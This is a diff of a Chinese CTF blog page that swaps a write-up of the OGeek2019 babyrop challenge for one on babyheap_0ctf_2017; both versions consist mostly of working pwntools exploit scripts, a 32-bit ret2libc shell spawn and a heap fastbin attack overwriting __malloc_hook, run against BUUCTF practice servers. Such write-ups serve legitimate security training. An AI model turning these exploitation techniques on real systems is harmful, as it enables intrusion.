@@ -11,7 +11,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title>OGeek2019_babyrop |  屿</title>
+      <title>babyheap_0ctf_2017 |  屿</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="/favicon.ico" />
@@ -66,7 +66,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-OGeek2019 babyrop"
+  id="post-babyheap_0ctf_2017"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -77,7 +77,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  OGeek2019_babyrop
+  babyheap_0ctf_2017
 </h1>
  
 
@@ -85,8 +85,8 @@
     </header>
      
     <div class="article-meta">
-      <a href="/2021/10/10/OGeek2019%20babyrop/" class="article-date">
-  <time datetime="2021-10-10T01:00:00.000Z" itemprop="datePublished">2021-10-10</time>
+      <a href="/2021/10/25/babyheap_0ctf_2017/" class="article-date">
+  <time datetime="2021-10-25T01:00:00.000Z" itemprop="datePublished">2021-10-25</time>
 </a> 
   <div class="article-category">
     <a class="article-category-link" href="/categories/buu/">buu</a> / <a class="article-category-link" href="/categories/buu/pwn/">pwn</a>
@@ -97,7 +97,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">358</span>
+            <span class="post-count">322</span>
         </span>
     </span>
 
@@ -119,27 +119,15 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <p>checksec </p>
-<p><img src="/2021/10/10/OGeek2019%20babyrop/image-20211021235625510.png"></p>
+  <p>checksec</p>
+<p><img src="/2021/10/25/babyheap_0ctf_2017/image-20211023004434342.png"></p>
 <p>ida</p>
-<p><img src="/2021/10/10/OGeek2019%20babyrop/image-20211022001224677.png"></p>
-<p>sub函数看看</p>
-<p><img src="/2021/10/10/OGeek2019%20babyrop/image-20211022002155033.png"></p>
-<p>v5读入一个buf，而v1为buf的长度，然后一个strncmp函数</p>
-<p><img src="/2021/10/10/OGeek2019%20babyrop/image-20211022002313426.png"></p>
-<p>它是逐个字节进行比较的，而这里我们要让他直接停止比较，使得v1等于0 ，故往buf中写入\0。</p>
-<p>接下来是这个</p>
-<p><img src="/2021/10/10/OGeek2019%20babyrop/image-20211022002756780.png"></p>
-<p>这边传进来的参数，是前面buf中最后一个字节的int值。而这里要从e7开始溢出，故只能用else中的read函数，所以buf中最后一个字节要尽可能的大。</p>
-<p>exp：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#32位程序，先用\0终止strlen函数，之后用Ret2libc得到sys与binsh地址</span></span><br><span class="line"><span class="comment">#用write_plt泄露write的地址</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29773</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn9&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc-2.23.so&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&quot;./pwn9&quot;</span>)</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt_addr = e.plt[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">write_got_addr = e.got[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">sub_080487D0 = <span class="number">0x080487D0</span></span><br><span class="line">payload1 = <span class="string">b&#x27;\0&#x27;</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">6</span> + p32(<span class="number">0xff</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload1)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0xE7</span> + <span class="number">4</span></span><br><span class="line">payload2 = offset*<span class="string">b&#x27;a&#x27;</span> + p32(write_plt_addr) + p32(sub_080487D0) + p32(<span class="number">1</span>) + p32(write_got_addr) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Correct\n&quot;</span>)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">write_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr)) </span><br><span class="line">libcbase = write_addr -<span class="number">0x0d43c0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libcbase:&#x27;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line">sys_addr = libcbase +<span class="number">0x03a940</span></span><br><span class="line">bin_sh = libcbase + <span class="number">0x15902b</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#libc = LibcSearcher(&#x27;write&#x27;,write_addr)</span></span><br><span class="line"><span class="comment">#libcbase= write_addr -libc.dump(&#x27;write&#x27;)</span></span><br><span class="line"><span class="comment">#sys_addr = libcbase + libc.dump(&#x27;system&#x27;)</span></span><br><span class="line"><span class="comment">#bin_sh = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload3 = offset * <span class="string">b&#x27;A&#x27;</span> + p32(sys_addr)+ p32(<span class="number">0</span>)  + p32(bin_sh)</span><br><span class="line"></span><br><span class="line">io.sendline(payload3)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="/2021/10/25/babyheap_0ctf_2017/image-20211023005002273.png"></p>
+<p>伪代码是一个菜单，分别有allocate、fill、free、dump四个功能</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#远程能通，本地不通。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">rl=<span class="keyword">lambda</span> :io.recvline()</span><br><span class="line">rn=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    sla(<span class="string">&#x27;Command: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    sla(<span class="string">&#x27;Command: &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sla(<span class="string">&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    sla(<span class="string">&#x27;Content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    sla(<span class="string">&#x27;Command: &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span>(<span class="params">index</span>):</span></span><br><span class="line">    sla(<span class="string">&#x27;Command: &#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27348</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn23&#x27;)</span></span><br><span class="line">add(<span class="number">0x20</span>)									<span class="comment">#开5个堆，前四个大小一致位0x20，第五个为0x100</span></span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)										<span class="comment">#free释放下标为1、2的堆</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">fill(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">5</span>+p64(<span class="number">0x31</span>)+p64(<span class="number">0</span>)*<span class="number">5</span>+p64(<span class="number">0x31</span>)+p8(<span class="number">0xc0</span>))	<span class="comment">#fill填充下标为0开始的堆</span></span><br><span class="line">fill(<span class="number">3</span>,p64(<span class="number">0</span>)*<span class="number">5</span>+p64(<span class="number">0x31</span>))					<span class="comment">#填充下标为3开始的堆</span></span><br><span class="line">add(<span class="number">0x20</span>)							</span><br><span class="line">add(<span class="number">0x20</span>)							</span><br><span class="line">fill(<span class="number">3</span>,p64(<span class="number">0</span>)*<span class="number">5</span>+p64(<span class="number">0x111</span>))					</span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">rl()										<span class="comment">#本地运行时取消</span></span><br><span class="line">libc_base=u64(rn(<span class="number">8</span>))-(<span class="number">0x3c4b20</span>+<span class="number">0x58</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">fill(<span class="number">2</span>,p64(libc_base+<span class="number">0x3c4b10</span>-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">fill(<span class="number">6</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p8(<span class="number">0</span>)*<span class="number">3</span>+p64(libc_base+<span class="number">0x4526a</span>))</span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>这边用远程libcsearcher找不到合适的动态链接库，所以只好手动打了。</p>
-<p>总结：</p>
-<ul>
-<li>32位ret2libc</li>
-<li>注意绕过题目中一些限制条件，这边用的绕过strlen。</li>
-</ul>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/tqydyqt/article/details/105321363">(3条消息) 【BUUCTF - PWN】babyheap_0ctf_2017_古月浪子的博客-CSDN博客_babyheap_0ctf_2017</a></p>
  
       <!-- reward -->
       
@@ -210,12 +198,12 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://iy30.github.io/2021/10/10/OGeek2019%20babyrop/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://iy30.github.io/2021/10/25/babyheap_0ctf_2017/" alt="微信分享二维码">
     </div>
 </div>
 
 <div id="share-mask"></div>  
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/32%E4%BD%8Dret2libc/" rel="tag">32位ret2libc</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%94%A8write%E6%B3%84%E9%9C%B2%E5%9C%B0%E5%9D%80/" rel="tag">用write泄露地址</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/heap/" rel="tag">heap</a></li></ul>
 
     </footer>
   </div>
@@ -223,19 +211,10 @@
    
   <nav class="article-nav">
     
-      <a href="/2021/10/10/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%20%E5%86%B3%E8%B5%9B%20PWN5/" class="article-nav-link">
-        <strong class="article-nav-caption">上一篇</strong>
-        <div class="article-nav-title">
-          
-            第五空间2019_决赛PWN5
-          
-        </div>
-      </a>
     
-    
-      <a href="/2021/09/24/heap/" class="article-nav-link">
+      <a href="/2021/10/25/pie_1/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">heap</div>
+        <div class="article-nav-title">pie_1</div>
       </a>
     
   </nav>
